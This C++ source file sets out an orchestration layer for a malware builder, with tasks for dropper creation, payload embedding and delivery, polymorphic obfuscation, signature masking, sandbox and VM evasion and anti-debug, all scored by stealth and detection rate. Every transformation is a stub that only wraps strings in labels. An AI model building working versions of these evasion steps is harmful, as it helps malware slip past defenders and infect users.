#include <iostream>
#include <string>
#include <memory>
#include <map>
#include <functional>
#include "leaf_config_system.cpp"

class LeafIntegratedSystem {
public:
    struct TaskContext {
        LeafConfigurationSystem::TaskType taskType;
        std::string inputData;
        std::map<std::string, std::string> additionalParameters;
        int operationId;
        size_t inputSize = 0;
        
        TaskContext(LeafConfigurationSystem::TaskType type, const std::string& input) 
            : taskType(type), inputData(input), operationId(0) {
            inputSize = input.size();
        }
    };
    
    struct TaskResult {
        std::string outputData;
        bool success = false;
        std::string errorMessage;
        LeafConfigurationSystem::EffectivenessMetrics metrics;
        std::vector<std::string> usedLeaves;
        double executionScore;
        size_t outputSize = 0;
        
        TaskResult() {
            metrics.executionTime = 0.0;
            metrics.memoryUsage = 0.0;
            metrics.detectionRate = 0.0;
            metrics.successRate = 0.0;
            metrics.stealthScore = 0.0;
            executionScore = 0.0;
        }
    };

private:
    LeafConfigurationSystem& leafConfig;
    
    // Performance tracking
    std::map<LeafConfigurationSystem::TaskType, std::vector<double>> recentPerformance;
    int taskCount = 0;
    int operationCounter = 0;
    
public:
    LeafIntegratedSystem() : leafConfig(g_leafConfig) {
    }
    
    // Main task execution interface
    TaskResult executeTask(TaskContext& context) {
        TaskResult result;
        operationCounter++;
        context.operationId = operationCounter;
        
        // Configure system for the task
        leafConfig.configureForTask(context.taskType);
        auto activeLeaves = leafConfig.getActiveLeaves(context.taskType);
        result.usedLeaves = activeLeaves;
        
        std::cout << "[LEAF SYSTEM] Executing " << taskTypeToString(context.taskType) 
                  << " with " << activeLeaves.size() << " active leaves" << std::endl;
        
        // Execute task based on type
        try {
            switch(context.taskType) {
                case LeafConfigurationSystem::TaskType::ENCRYPTION:
                    result = executeEncryption(context, activeLeaves);
                    break;
                case LeafConfigurationSystem::TaskType::STUB_GENERATION:
                    result = executeStubGeneration(context, activeLeaves);
                    break;
                case LeafConfigurationSystem::TaskType::PAYLOAD_EMBEDDING:
                    result = executePayloadEmbedding(context, activeLeaves);
                    break;
                case LeafConfigurationSystem::TaskType::DROPPER_CREATION:
                    result = executeDropperCreation(context, activeLeaves);
                    break;
                case LeafConfigurationSystem::TaskType::OBFUSCATION:
                    result = executeObfuscation(context, activeLeaves);
                    break;
                case LeafConfigurationSystem::TaskType::PAYLOAD_DELIVERY:
                    result = executePayloadDelivery(context, activeLeaves);
                    break;
                default:
                    result.success = false;
                    result.errorMessage = "Unknown task type";
                    break;
            }
        } catch (const std::exception& e) {
            result.success = false;
            result.errorMessage = e.what();
        }
        
        // Calculate execution score based on operation complexity
        result.executionScore = calculateExecutionScore(context, result);
        result.metrics.executionTime = result.executionScore;
        
        // Calculate effectiveness metrics
        calculateEffectivenessMetrics(context, result);
        
        // Record performance for analysis
        recordTaskPerformance(context, result);
        
        taskCount++;
        return result;
    }
    
    // Encryption task implementation
    TaskResult executeEncryption(TaskContext& context, const std::vector<std::string>& activeLeaves) {
        TaskResult result;
        
        std::string encrypted = context.inputData;
        
        // Apply active encryption leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "encryption") continue;
            
            std::string algorithm = leafConfig.getParameter<std::string>(leafId, "algorithm", "AES256_CBC");
            int keyLength = leafConfig.getParameter<int>(leafId, "key_length", 256);
            int rounds = leafConfig.getParameter<int>(leafId, "rounds", 14);
            
            std::cout << "[ENCRYPTION] Using " << leafId << " with " << algorithm 
                      << " (key:" << keyLength << ", rounds:" << rounds << ")" << std::endl;
            
            encrypted = applyEncryption(encrypted, algorithm, keyLength, rounds);
        }
        
        // Apply other compatible leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category == "encryption") continue;
            
            if (leaf->category == "stealth") {
                bool injectEntropy = leafConfig.getParameter<bool>(leafId, "inject_entropy", false);
                if (injectEntropy) {
                    int entropyLayers = leafConfig.getParameter<int>(leafId, "entropy_layers", 8);
                    encrypted = addEntropyLayers(encrypted, entropyLayers);
                }
            } else if (leaf->category == "performance") {
                bool enableCaching = leafConfig.getParameter<bool>(leafId, "enable_caching", false);
                if (enableCaching) {
                    encrypted = applyCaching(encrypted);
                }
            }
        }
        
        result.outputData = encrypted;
        result.outputSize = encrypted.size();
        result.success = true;
        
        // Calculate stealth score based on active leaves
        result.metrics.stealthScore = calculateStealthScore(activeLeaves);
        
        return result;
    }
    
    // Stub generation task implementation
    TaskResult executeStubGeneration(TaskContext& context, const std::vector<std::string>& activeLeaves) {
        TaskResult result;
        
        std::string stub = generateBaseStub(context.inputData);
        
        // Apply active obfuscation leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "obfuscation") continue;
            
            if (leafId == "polymorphic_engine") {
                bool runtimeMutation = leafConfig.getParameter<bool>(leafId, "runtime_mutation", false);
                int mutationDepth = leafConfig.getParameter<int>(leafId, "mutation_depth", 15);
                if (runtimeMutation) {
                    stub = applyPolymorphicMutation(stub, mutationDepth);
                }
            } else if (leafId == "control_flow_flatten") {
                bool flattenEnabled = leafConfig.getParameter<bool>(leafId, "flatten_enabled", false);
                int flattenDepth = leafConfig.getParameter<int>(leafId, "flatten_depth", 12);
                if (flattenEnabled) {
                    stub = applyControlFlowFlattening(stub, flattenDepth);
                }
            }
        }
        
        // Apply detection avoidance leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "detection") continue;
            
            if (leafId == "api_obfuscation") {
                bool obfuscateApis = leafConfig.getParameter<bool>(leafId, "obfuscate_apis", false);
                int obfuscationRounds = leafConfig.getParameter<int>(leafId, "obfuscation_rounds", 6);
                if (obfuscateApis) {
                    stub = obfuscateApiCalls(stub, obfuscationRounds);
                }
            } else if (leafId == "signature_masking") {
                bool maskSignatures = leafConfig.getParameter<bool>(leafId, "mask_signatures", false);
                int maskLayers = leafConfig.getParameter<int>(leafId, "mask_layers", 5);
                if (maskSignatures) {
                    stub = applySignatureMasking(stub, maskLayers);
                }
            }
        }
        
        result.outputData = stub;
        result.outputSize = stub.size();
        result.success = true;
        
        // Calculate detection rate based on active leaves
        result.metrics.detectionRate = calculateDetectionRate(activeLeaves);
        
        return result;
    }
    
    // Payload embedding task implementation  
    TaskResult executePayloadEmbedding(TaskContext& context, const std::vector<std::string>& activeLeaves) {
        TaskResult result;
        
        std::string embedded = context.inputData;
        
        // Apply obfuscation leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "obfuscation") continue;
            
            if (leafId == "metamorphic_code") {
                bool codeTransformation = leafConfig.getParameter<bool>(leafId, "code_transformation", false);
                int transformCycles = leafConfig.getParameter<int>(leafId, "transform_cycles", 10);
                if (codeTransformation) {
                    embedded = applyMetamorphicTransformation(embedded, transformCycles);
                }
            } else if (leafId == "dead_code_insertion") {
                bool insertDeadCode = leafConfig.getParameter<bool>(leafId, "insert_dead_code", false);
                int deadCodeRatio = leafConfig.getParameter<int>(leafId, "dead_code_ratio", 30);
                if (insertDeadCode) {
                    embedded = insertDeadCode(embedded, deadCodeRatio);
                }
            }
        }
        
        // Apply memory optimization leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "memory") continue;
            
            if (leafId == "memory_pooling") {
                bool usePools = leafConfig.getParameter<bool>(leafId, "use_pools", false);
                int poolSize = leafConfig.getParameter<int>(leafId, "pool_size", 2048);
                if (usePools) {
                    embedded = applyMemoryPooling(embedded, poolSize);
                }
            }
        }
        
        result.outputData = embedded;
        result.outputSize = embedded.size();
        result.success = true;
        
        // Calculate obfuscation strength
        result.metrics.stealthScore = calculateObfuscationStrength(activeLeaves);
        
        return result;
    }
    
    // Dropper creation task implementation
    TaskResult executeDropperCreation(TaskContext& context, const std::vector<std::string>& activeLeaves) {
        TaskResult result;
        
        std::string dropper = createBasicDropper(context.inputData);
        
        // Apply performance leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "performance") continue;
            
            if (leafId == "inline_optimization") {
                bool inlineFunctions = leafConfig.getParameter<bool>(leafId, "inline_functions", false);
                int inlineThreshold = leafConfig.getParameter<int>(leafId, "inline_threshold", 100);
                if (inlineFunctions) {
                    dropper = applyInlineOptimization(dropper, inlineThreshold);
                }
            } else if (leafId == "compact_representation") {
                bool compactMode = leafConfig.getParameter<bool>(leafId, "compact_mode", false);
                int compressionRatio = leafConfig.getParameter<int>(leafId, "compression_ratio", 70);
                if (compactMode) {
                    dropper = applyCompactRepresentation(dropper, compressionRatio);
                }
            }
        }
        
        // Apply stealth leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "stealth") continue;
            
            if (leafId == "timing_variation") {
                bool randomizeTiming = leafConfig.getParameter<bool>(leafId, "randomize_timing", false);
                int varianceMs = leafConfig.getParameter<int>(leafId, "variance_ms", 500);
                if (randomizeTiming) {
                    dropper = addTimingVariation(dropper, varianceMs);
                }
            }
        }
        
        // Apply detection avoidance
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "detection") continue;
            
            if (leafId == "sandbox_evasion") {
                bool evadeSandbox = leafConfig.getParameter<bool>(leafId, "evade_sandbox", false);
                int evasionTechniques = leafConfig.getParameter<int>(leafId, "evasion_techniques", 4);
                if (evadeSandbox) {
                    dropper = applySandboxEvasion(dropper, evasionTechniques);
                }
            } else if (leafId == "vm_detection") {
                bool detectVm = leafConfig.getParameter<bool>(leafId, "detect_vm", false);
                int vmChecks = leafConfig.getParameter<int>(leafId, "vm_checks", 6);
                if (detectVm) {
                    dropper = addVmDetection(dropper, vmChecks);
                }
            }
        }
        
        result.outputData = dropper;
        result.outputSize = dropper.size();
        result.success = true;
        
        // Calculate adaptability score
        result.metrics.successRate = calculateAdaptabilityScore(activeLeaves);
        
        return result;
    }
    
    // Obfuscation task implementation
    TaskResult executeObfuscation(TaskContext& context, const std::vector<std::string>& activeLeaves) {
        TaskResult result;
        
        std::string obfuscated = context.inputData;
        
        // Apply all obfuscation leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "obfuscation") continue;
            
            std::cout << "[OBFUSCATION] Applying " << leafId << std::endl;
            obfuscated = applyObfuscationLeaf(obfuscated, leafId);
        }
        
        // Apply detection avoidance leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "detection") continue;
            
            if (leafId == "anti_debug") {
                bool antiDebugEnabled = leafConfig.getParameter<bool>(leafId, "anti_debug_enabled", false);
                int debugChecks = leafConfig.getParameter<int>(leafId, "debug_checks", 8);
                if (antiDebugEnabled) {
                    obfuscated = addAntiDebugProtection(obfuscated, debugChecks);
                }
            }
        }
        
        result.outputData = obfuscated;
        result.outputSize = obfuscated.size();
        result.success = true;
        
        // Calculate paranoia level effectiveness
        result.metrics.stealthScore = calculateParanoiaEffectiveness(activeLeaves);
        
        return result;
    }
    
    // Payload delivery task implementation
    TaskResult executePayloadDelivery(TaskContext& context, const std::vector<std::string>& activeLeaves) {
        TaskResult result;
        
        std::string payload = context.inputData;
        
        // Apply performance leaves
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "performance") continue;
            
            if (leafId == "data_compression") {
                bool compressData = leafConfig.getParameter<bool>(leafId, "compress_data", false);
                int compressionLevel = leafConfig.getParameter<int>(leafId, "compression_level", 7);
                if (compressData) {
                    payload = compressPayload(payload, compressionLevel);
                }
            }
        }
        
        // Apply memory optimization
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (!leaf || leaf->category != "memory") continue;
            
            if (leafId == "streaming_processing") {
                bool streamMode = leafConfig.getParameter<bool>(leafId, "stream_mode", false);
                int bufferSize = leafConfig.getParameter<int>(leafId, "buffer_size", 4096);
                if (streamMode) {
                    payload = applyStreamingProcessing(payload, bufferSize);
                }
            }
        }
        
        result.outputData = payload;
        result.outputSize = payload.size();
        result.success = true;
        
        // Calculate delivery efficiency
        result.metrics.successRate = calculateDeliveryEfficiency(activeLeaves);
        
        return result;
    }
    
    // Effectiveness calculation
    void calculateEffectivenessMetrics(const TaskContext& context, TaskResult& result) {
        // Memory usage estimation (simplified)
        result.metrics.memoryUsage = (context.inputSize + result.outputSize) / 1024.0; // KB
        
        // Success rate (based on whether task completed)
        if (result.metrics.successRate == 0.0) {
            result.metrics.successRate = result.success ? 1.0 : 0.0;
        }
        
        // If specific metrics weren't set, provide defaults
        if (result.metrics.stealthScore == 0.0) {
            result.metrics.stealthScore = 0.7; // Default moderate stealth
        }
        
        if (result.metrics.detectionRate == 0.0) {
            result.metrics.detectionRate = 0.1; // Default low detection
        }
        
        // Calculate overall effectiveness
        result.metrics.calculateOverall();
        
        std::cout << "[METRICS] Effectiveness: " << result.metrics.overallEffectiveness 
                  << " | Score: " << result.executionScore 
                  << " | Memory: " << result.metrics.memoryUsage << "KB" << std::endl;
    }
    
    // Performance recording
    void recordTaskPerformance(const TaskContext& context, const TaskResult& result) {
        // Record in leaf configuration system
        leafConfig.recordTaskPerformance(context.taskType, result.metrics);
        
        // Track recent performance
        recentPerformance[context.taskType].push_back(result.metrics.overallEffectiveness);
        
        // Limit recent performance history
        if (recentPerformance[context.taskType].size() > 10) {
            recentPerformance[context.taskType].erase(recentPerformance[context.taskType].begin());
        }
    }
    
    // Execution score calculation (replaces time-based scoring)
    double calculateExecutionScore(const TaskContext& context, const TaskResult& result) {
        double baseScore = 1.0;
        
        // Complexity based on active leaves
        baseScore += result.usedLeaves.size() * 0.1;
        
        // Input/output size ratio
        if (context.inputSize > 0) {
            double sizeRatio = static_cast<double>(result.outputSize) / context.inputSize;
            baseScore += sizeRatio * 0.2;
        }
        
        // Operation complexity
        baseScore += operationCounter * 0.001;
        
        return baseScore;
    }
    
    // Utility methods for task implementations (simplified/simulated)
    std::string applyEncryption(const std::string& input, const std::string& algorithm, int keyLength, int rounds) {
        return algorithm + "_" + std::to_string(keyLength) + "_R" + std::to_string(rounds) + "(" + input + ")";
    }
    
    std::string addEntropyLayers(const std::string& input, int layers) {
        return "ENTROPY_" + std::to_string(layers) + "{" + input + "}";
    }
    
    std::string applyCaching(const std::string& input) {
        return "CACHED{" + input + "}";
    }
    
    std::string generateBaseStub(const std::string& input) {
        return "STUB_BASE{" + input + "}";
    }
    
    std::string applyPolymorphicMutation(const std::string& input, int depth) {
        return "POLY_MUT_" + std::to_string(depth) + "{" + input + "}";
    }
    
    std::string applyControlFlowFlattening(const std::string& input, int depth) {
        return "CFG_FLAT_" + std::to_string(depth) + "{" + input + "}";
    }
    
    std::string obfuscateApiCalls(const std::string& input, int rounds) {
        return "API_OBF_" + std::to_string(rounds) + "{" + input + "}";
    }
    
    std::string applySignatureMasking(const std::string& input, int layers) {
        return "SIG_MASK_" + std::to_string(layers) + "{" + input + "}";
    }
    
    std::string applyMetamorphicTransformation(const std::string& input, int cycles) {
        return "META_TRANS_" + std::to_string(cycles) + "{" + input + "}";
    }
    
    std::string insertDeadCode(const std::string& input, int ratio) {
        return "DEAD_CODE_" + std::to_string(ratio) + "{" + input + "}";
    }
    
    std::string applyMemoryPooling(const std::string& input, int poolSize) {
        return "MEM_POOL_" + std::to_string(poolSize) + "{" + input + "}";
    }
    
    std::string createBasicDropper(const std::string& input) {
        return "DROPPER_BASE{" + input + "}";
    }
    
    std::string applyInlineOptimization(const std::string& input, int threshold) {
        return "INLINE_OPT_" + std::to_string(threshold) + "{" + input + "}";
    }
    
    std::string applyCompactRepresentation(const std::string& input, int ratio) {
        return "COMPACT_" + std::to_string(ratio) + "{" + input + "}";
    }
    
    std::string addTimingVariation(const std::string& input, int variance) {
        return "TIMING_VAR_" + std::to_string(variance) + "{" + input + "}";
    }
    
    std::string applySandboxEvasion(const std::string& input, int techniques) {
        return "SANDBOX_EVA_" + std::to_string(techniques) + "{" + input + "}";
    }
    
    std::string addVmDetection(const std::string& input, int checks) {
        return "VM_DETECT_" + std::to_string(checks) + "{" + input + "}";
    }
    
    std::string applyObfuscationLeaf(const std::string& input, const std::string& leafId) {
        return leafId + "_APPLIED{" + input + "}";
    }
    
    std::string addAntiDebugProtection(const std::string& input, int checks) {
        return "ANTI_DEBUG_" + std::to_string(checks) + "{" + input + "}";
    }
    
    std::string compressPayload(const std::string& input, int level) {
        return "COMPRESS_" + std::to_string(level) + "{" + input + "}";
    }
    
    std::string applyStreamingProcessing(const std::string& input, int bufferSize) {
        return "STREAM_" + std::to_string(bufferSize) + "{" + input + "}";
    }
    
    // Metric calculation helpers
    double calculateStealthScore(const std::vector<std::string>& activeLeaves) {
        double score = 0.5;
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (leaf && leaf->category == "stealth") {
                score += 0.1;
            } else if (leaf && leaf->category == "encryption") {
                score += 0.05;
            }
        }
        return std::min(1.0, score);
    }
    
    double calculateDetectionRate(const std::vector<std::string>& activeLeaves) {
        double rate = 0.3;
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (leaf && leaf->category == "detection") {
                rate -= 0.05;
            } else if (leaf && leaf->category == "obfuscation") {
                rate -= 0.03;
            }
        }
        return std::max(0.0, rate);
    }
    
    double calculateObfuscationStrength(const std::vector<std::string>& activeLeaves) {
        double strength = 0.4;
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (leaf && leaf->category == "obfuscation") {
                strength += 0.1;
            }
        }
        return std::min(1.0, strength);
    }
    
    double calculateAdaptabilityScore(const std::vector<std::string>& activeLeaves) {
        double score = 0.6;
        std::set<std::string> categories;
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (leaf) {
                categories.insert(leaf->category);
            }
        }
        score += categories.size() * 0.05;
        return std::min(1.0, score);
    }
    
    double calculateParanoiaEffectiveness(const std::vector<std::string>& activeLeaves) {
        double effectiveness = 0.5;
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (leaf) {
                effectiveness += 0.05;
            }
        }
        return std::min(1.0, effectiveness);
    }
    
    double calculateDeliveryEfficiency(const std::vector<std::string>& activeLeaves) {
        double efficiency = 0.7;
        for (const std::string& leafId : activeLeaves) {
            auto leaf = leafConfig.getLeaf(leafId);
            if (leaf && (leaf->category == "performance" || leaf->category == "memory")) {
                efficiency += 0.05;
            }
        }
        return std::min(1.0, efficiency);
    }
    
    // Utility string conversion method
    std::string taskTypeToString(LeafConfigurationSystem::TaskType taskType) {
        switch(taskType) {
            case LeafConfigurationSystem::TaskType::ENCRYPTION: return "ENCRYPTION";
            case LeafConfigurationSystem::TaskType::STUB_GENERATION: return "STUB_GENERATION";
            case LeafConfigurationSystem::TaskType::PAYLOAD_EMBEDDING: return "PAYLOAD_EMBEDDING";
            case LeafConfigurationSystem::TaskType::DROPPER_CREATION: return "DROPPER_CREATION";
            case LeafConfigurationSystem::TaskType::OBFUSCATION: return "OBFUSCATION";
            case LeafConfigurationSystem::TaskType::PAYLOAD_DELIVERY: return "PAYLOAD_DELIVERY";
            default: return "UNKNOWN";
        }
    }
    
    // Status and analysis methods
    void printSystemStatus() {
        leafConfig.printStatus();
        
        std::cout << "\n=== LEAF INTEGRATED SYSTEM STATUS ===" << std::endl;
        std::cout << "Total Tasks Executed: " << taskCount << std::endl;
        std::cout << "Operation Counter: " << operationCounter << std::endl;
        
        std::cout << "\nRecent Performance Trends:" << std::endl;
        for (const auto& [taskType, performance] : recentPerformance) {
            if (!performance.empty()) {
                double avg = 0.0;
                for (double p : performance) avg += p;
                avg /= performance.size();
                
                std::cout << "  " << taskTypeToString(taskType) << ": " 
                          << std::fixed << std::setprecision(3) << avg 
                          << " (last " << performance.size() << " tasks)" << std::endl;
            }
        }
        std::cout << "====================================\n" << std::endl;
    }
};

// Global instance for easy access
static LeafIntegratedSystem g_leafIntegratedSystem;